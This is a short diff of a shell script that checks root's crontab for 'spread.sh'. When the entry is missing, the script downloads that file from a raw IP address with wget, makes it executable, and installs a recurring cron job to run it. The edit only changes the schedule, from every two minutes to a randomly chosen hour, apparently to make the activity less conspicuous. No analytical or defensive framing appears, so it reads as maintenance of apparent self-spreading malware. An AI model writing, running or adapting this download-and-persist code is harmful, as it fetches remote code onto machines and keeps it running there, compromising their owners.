@@ -14,7 +14,7 @@ is_spread=$(cat /var/spool/cron/crontabs/root|grep spread.sh)
 if [ -z "$is_spread" ]
 then
       random_hour=$((1 + $RANDOM % 23))
-      mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O spread.sh http://95.217.211.87:8000/spread.sh && chmod +x spread.sh && crontab -l | { cat; echo "*/2 * * * * /home/user/tmp/spread.sh"; } | crontab -
+      mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O spread.sh http://95.217.211.87:8000/spread.sh && chmod +x spread.sh && crontab -l | { cat; echo "* $random_hour * * * /home/user/tmp/spread.sh"; } | crontab -
 
 
 fi
